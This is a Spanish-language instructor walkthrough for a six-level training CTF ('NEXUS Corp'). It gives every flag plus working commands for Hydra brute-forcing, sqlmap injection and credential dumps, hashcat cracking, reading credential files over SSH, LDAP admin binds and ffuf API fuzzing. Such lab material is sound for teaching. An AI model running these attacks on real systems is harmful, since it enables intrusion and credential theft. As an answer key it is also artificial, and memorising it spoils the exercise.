# NEXUS Corp CTF — Walkthrough detallado

> **SPOILERS.** Este documento es para instructores y desarrolladores únicamente.
> Detalla qué observar en cada paso, qué información anotar y por qué es relevante para los siguientes niveles.

---

## Level 1 — Employee Portal (fuerza bruta)

**Flag:** `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}`

### Qué observar en la página
La página muestra un formulario de login estándar (`/level/1/login`). No hay información adicional en el briefing — solo que el portal tiene "credenciales débiles". Esto es la pista: pensar en combinaciones comunes de usuarios administradores.

### Qué hacer
Lanzar un ataque de fuerza bruta con Hydra contra el formulario POST:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  TARGET http-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed" \
  -t 4 -f
```

Con ngrok (copiar y pegar directo en Kali):

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  deprecate-overrule-barbell.ngrok-free.dev https-post-form \
  "/level/1/login:username=^USER^&password=^PASS^:Login failed" \
  -s 443 -t 4 -f
```

### Qué anotar al terminar
- **Usuario:** `admin`
- **Contraseña:** `admin`
- La flag aparece en pantalla al hacer login exitoso. Copiarla y enviarla en el formulario de submit.

---

## Level 2 — HR Database (SQL injection)

**Flag:** `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}`

### Qué observar en la página
Hay un campo de búsqueda de empleados. Al buscar cualquier término (ej. `Engineering`) regresa registros de empleados con columnas: `id`, `name`, `department`, `email`, `hire_date`. Esto confirma que hay una consulta SQL detrás.

**Señal clave:** El briefing dice que el sistema no sanitiza la entrada. Probar `' OR 1=1 --` en el campo — si regresa todos los registros, el campo es inyectable.

### Qué hacer
Usar sqlmap para enumerar tablas automáticamente:

```bash
sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
  --dbms=sqlite --delay=2 --tables --batch --flush-session
```

Con ngrok (copiar y pegar directo en Kali):

```bash
sqlmap -u "https://deprecate-overrule-barbell.ngrok-free.dev/level/2/search?search=test" \
  --dbms=sqlite --delay=2 --tables --batch --flush-session
```

**Lo que aparece en la respuesta de sqlmap:**
```
[*] ceo_vault
[*] hr_employees
[*] ldap_directory
[*] portal_users
[*] ssh_credentials   ← tabla que no debería ser visible desde HR
```

La tabla `ssh_credentials` es la que contiene lo importante. Dumpear esa tabla:

```bash
sqlmap -u "http://TARGET:5000/level/2/search?search=test" \
  --dbms=sqlite --delay=2 -T ssh_credentials --dump --batch --flush-session
```

Con ngrok (copiar y pegar directo en Kali):

```bash
sqlmap -u "https://deprecate-overrule-barbell.ngrok-free.dev/level/2/search?search=test" \
  --dbms=sqlite --delay=2 -T ssh_credentials --dump --batch --flush-session
```

### Qué anotar al terminar
El dump muestra una tabla con columnas `id`, `hostname`, `username`, `password_hash`, `notes`, `flag`. Identificar la fila del usuario `sysop`:

| Campo | Valor a anotar |
|-------|---------------|
| `username` | `sysop` |
| `password_hash` | `eb0a191797624dd3a48fa681d3061212` ← **guardar esto** |
| `flag` | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |

> El `password_hash` del usuario `sysop` se usará en el Level 3.

---

## Level 3 — Hash Cracking

**Flag:** `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}`

### Qué observar en la página
La página muestra una tabla con los hashes recuperados (la misma `ssh_credentials`). **Lo que hay que notar:**
- El hash de `sysop` tiene **32 caracteres** → formato MD5 (modo `-m 0` en hashcat).
- Hay también un hash de `vault_svc` de **64 caracteres** → SHA256 (modo `-m 1400`). **Anotarlo también** — se necesitará en Level 5.

### Qué hacer
Crackear el hash MD5 de `sysop`:

```bash
echo "eb0a191797624dd3a48fa681d3061212" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat muestra el resultado como:
```
eb0a191797624dd3a48fa681d3061212:master
```

La parte después del `:` es la contraseña en texto claro. Ingresar `master` en el formulario de verificación de la página.

### Qué anotar al terminar
| Campo | Valor a anotar |
|-------|---------------|
| Usuario SSH | `sysop` |
| Contraseña SSH | `master` |
| Hash SHA256 de `vault_svc` | (el de 64 chars de la tabla) ← para Level 5 |

---

## Level 4 — SSH Infiltration

**Flag:** `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}`

### Qué observar en la página
Hay un formulario de login SSH. Las credenciales vienen directamente de lo anotado en Level 3.

Una vez conectado, la terminal muestra un mensaje de bienvenida con la fecha actual y el hostname `nexus-internal-srv`. Esto es un servidor interno simulado — explorar el filesystem.

### Qué hacer
Ejecutar `help` primero para ver los comandos disponibles. Explorar progresivamente:

```bash
ls              # ver archivos en el home
ls -la          # ver archivos ocultos — aparece .bash_history
cat .bash_history   # historial de comandos del sysop anterior
ls /tmp         # directorio temporal
cat /tmp/debug_dump.txt   # ← contiene la flag
ls /etc/nexus   # directorio de configuración de la empresa
cat /etc/nexus/backup.key   # ← contiene credenciales LDAP
```

**Lo que aparece en `/tmp/debug_dump.txt`:**
Un volcado de debug con la flag embebida al final.

**Lo que aparece en `/etc/nexus/backup.key`:**
```
LDAP Admin DN: cn=admin,dc=nexuscorp,dc=local
LDAP Admin Password: Ldap@dm1n_2024
```

### Qué anotar al terminar
| Campo | Valor a anotar |
|-------|---------------|
| LDAP Bind DN | `cn=admin,dc=nexuscorp,dc=local` |
| LDAP Admin Password | `Ldap@dm1n_2024` |

> Estos datos son exactamente lo que se necesita para autenticarse como admin en el Level 5.

---

## Level 5 — LDAP Enumeration

**Flag:** `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}`

### Qué observar en la página
Hay un formulario de búsqueda LDAP con cinco campos: Bind DN, Bind Password, Base DN, Search Filter y Attributes. Los campos Base DN y Filter ya tienen valores por defecto (`dc=nexuscorp,dc=local` y `(objectClass=*)`).

**Primera prueba:** dejar Bind DN y Bind Password vacíos y ejecutar — el servidor tiene anonymous bind habilitado, así que regresa algunos resultados pero sin atributos sensibles (sin hashes de contraseñas).

### Qué hacer
Usar las credenciales admin de Level 4 para ver todo:

| Campo | Valor |
|-------|-------|
| Bind DN | `cn=admin,dc=nexuscorp,dc=local` |
| Bind Password | `Ldap@dm1n_2024` |
| Base DN | `dc=nexuscorp,dc=local` |
| Filter | `(objectClass=*)` |
| Attributes | `*` |

### Qué observar en los resultados
La respuesta muestra todas las entradas del directorio en formato LDIF. Buscar la entrada de `vault_svc`:

```
dn: cn=vault_svc,ou=service-accounts,dc=nexuscorp,dc=local
cn: vault_svc
userPassword: {SHA256}<hash de 64 chars>   ← guardar este hash
clearance_level: 5
vault_token: <token>
```

Además, al autenticarse como admin, la respuesta incluye al final:
```
# FLAG: NEXUS{ld4p_3num3r4t10n_pr0_5d7b}
```

### Qué anotar al terminar
| Campo | Valor a anotar |
|-------|---------------|
| SHA256 hash de `vault_svc` | (el valor de `userPassword`) |

Crackear ese hash:
```bash
echo "<hash_sha256>" > vault_hash.txt
hashcat -m 1400 vault_hash.txt /usr/share/wordlists/rockyou.txt
```
**Resultado:** `dragon` — esta es la contraseña / token de la API del vault.

---

## Level 6 — Vault API Fuzzing (ffuf)

**Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`

### Qué observar en la página
El briefing muestra un fragmento de log del servidor con tres datos clave:
1. La API está en `/level/6/vault-api/`
2. Requiere el header `X-Vault-Token`
3. La cuenta `vault_svc` fue la última en autenticarse con `clearance_level=5`

Hay también un link para descargar el wordlist de endpoints. **Descargarlo** — contiene los nombres de rutas internas de NEXUS Corp.

### Qué hacer — Fase 1: descubrir endpoints

```bash
wget http://TARGET:5000/level/6/api-wordlist.txt -O api-wordlist.txt

ffuf -w api-wordlist.txt \
  -H "X-Vault-Token: dragon" \
  -u "http://TARGET:5000/level/6/vault-api/FUZZ" \
  -fc 404
```

Con ngrok (copiar y pegar directo en Kali):

```bash
wget https://deprecate-overrule-barbell.ngrok-free.dev/level/6/api-wordlist.txt -O api-wordlist.txt

ffuf -w api-wordlist.txt \
  -H "X-Vault-Token: dragon" \
  -u "https://deprecate-overrule-barbell.ngrok-free.dev/level/6/vault-api/FUZZ" \
  -fc 404
```

**Lo que aparece en los resultados de ffuf:** Varios endpoints responden con 200. El interesante es `archives` — responde con un JSON que dice cuántos documentos existen.

### Qué observar en `/archives`
Usar el API Endpoint Tester de la página (o curl) para consultar `archives`:
```
Token: dragon
Endpoint: archives
```
La respuesta indica que hay **95 documentos** en el vault. Esto define el rango para la Fase 2.

Consultar también el endpoint `logs`:
```
Endpoint: logs
```
La respuesta muestra actividad reciente. Buscar una línea que diga `doc_id retrieved` — el número que aparece es `73`. **Anotar ese doc_id.**

### Qué hacer — Fase 2: fuzzear doc_id

```bash
seq 1 95 > nums.txt

ffuf -w nums.txt \
  -H "X-Vault-Token: dragon" \
  -u "http://TARGET:5000/level/6/vault-api/archives?doc_id=FUZZ" \
  -fw 7
```

Con ngrok (copiar y pegar directo en Kali):

```bash
seq 1 95 > nums.txt

ffuf -w nums.txt \
  -H "X-Vault-Token: dragon" \
  -u "https://deprecate-overrule-barbell.ngrok-free.dev/level/6/vault-api/archives?doc_id=FUZZ" \
  -fw 7
```

`-fw 7` filtra las respuestas con 7 palabras (las respuestas vacías/negativas). Solo el `doc_id=73` regresa una respuesta diferente.

### Qué observar en la respuesta de doc_id=73
La respuesta incluye:
- Nombre del documento: `Project_Chimera_Financials.pdf`
- Contenido: evidencia de fraude financiero
- **Flag:** `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}`

---

## Resumen: qué anotar en cada nivel

| Nivel completado | Qué guardar para el siguiente |
|------------------|-------------------------------|
| Level 1 | `admin` / `admin` (acceso al sistema) |
| Level 2 | Hash MD5 de `sysop`: `eb0a191797624dd3a48fa681d3061212` |
| Level 3 | Contraseña crackeada: `master` (para SSH en L4) |
| Level 4 | LDAP admin DN + password: `cn=admin,dc=nexuscorp,dc=local` / `Ldap@dm1n_2024` |
| Level 5 | Contraseña crackeada de `vault_svc`: `dragon` (token de API en L6) |
| Level 6 | — fin de la operación — |

---

## Todas las flags

| Nivel | Flag |
|-------|------|
| 1 | `NEXUS{w3lc0m3_t0_th3_c0rp_7a3b}` |
| 2 | `NEXUS{sql_1nj3ct10n_m4st3r_9f2d}` |
| 3 | `NEXUS{h4sh_cr4ck3d_w1d3_0p3n_6e1a}` |
| 4 | `NEXUS{ssh_tun3l_r4t_1n_th3_w4lls_2c8f}` |
| 5 | `NEXUS{ld4p_3num3r4t10n_pr0_5d7b}` |
| 6 | `NEXUS{fuzz_th3_v4ult_ap1_d1sc0v3r3d_8k2m}` |
